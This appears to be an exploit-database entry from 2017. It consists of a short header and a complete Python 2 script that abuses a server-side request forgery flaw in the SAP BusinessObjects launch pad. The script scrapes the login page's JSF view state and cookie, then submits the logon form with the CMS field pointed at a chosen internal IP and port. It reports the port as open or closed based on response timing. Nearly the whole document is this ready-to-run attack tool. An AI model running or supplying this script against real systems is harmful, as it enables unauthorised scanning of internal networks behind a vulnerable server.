# Exploit Title: SAP BusinessObjects launch pad SSRF
# Date: 2017-11-8
# Exploit Author: Ahmad Mahfouz
# Category: Webapps
# Author Homepage: www.unixawy.com
# Description: Design Error in SAP BusinessObjects launch pad leads to SSRF attack 

 
#!/usr/bin/env python
# SAP BusinessObjects launch pad SSRF Timing Attack Port scan
# usage : sblpta.py http://path.faces targetIP targetPort
import urllib2
import urllib
import ssl
from datetime import datetime
import sys

 

if len(sys.argv) != 4:

   print "Usage: python sblpta.py http://path.faces targetIP targetPort"
   sys.exit(1)

url = sys.argv[1]
targetIP = sys.argv[2]
targetPort = sys.argv[3]
targetHostIP = "%s:%s" %(targetIP,targetPort)
print "\r\n" 
print "[*] SAP BusinessObjects Timing Attack"
headers = {'User-Agent': 'Mozilla/5.0'}
gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)

try:

   request = urllib2.Request(url, headers=headers)
   page = urllib2.urlopen(request, context=gcontext)
   print "[*] Connected to SAP Bussiness Object %s"  %url

except:

   print "[-] Failed To connect to SAP Bussiness Object %s" %url
   print "[*] SAP Bussiness Object Link example: http://domain:port/BZ/portal/95000047/InfoView/logon.faces"
   sys.exit(2)

 
resheaders = page.info()
cookie = resheaders.dict['set-cookie']
content = page.readlines()

for line in content:

   if "com.sun.faces.VIEW" in line:
      sfview = line.split("=")[4].split("\"")[1]
      print "[*] Got java faces dynamic value"

   else:
      continue

if not sfview:

   print "[-] Failed to java faces dynamic value, are you sure you extracted the java faces form from the link ??"
   sys.exit(3)


formdata = {"_id0:logon:CMS":targetHostIP,
         "_id0:logon:USERNAME":"",
         "_id0:logon:PASSWORD":"",
         "com.sun.faces.VIEW":sfview,
         "_id0":"_id0"
         }

 

data_encode = urllib.urlencode(formdata)
start =  datetime.now()
print "[*] Testing Timing Attack %s" %start        
request = urllib2.Request(url,data_encode)
request.add_header('Cookie', cookie)
response  = urllib2.urlopen(request)
end = datetime.now()
the_page = response.read()


if "FWM" in the_page:
 
   elapsedTime = end-start
   if elapsedTime.total_seconds() >= 10:

      print "[*] Port %s is Open, Gotcha !!! " %targetPort

   else:

      print "[*] Port %s is Closed , we die fast"  %targetPort

elif "FWC" in the_page:

   print "[-] error login expired"
   sys.exit(10)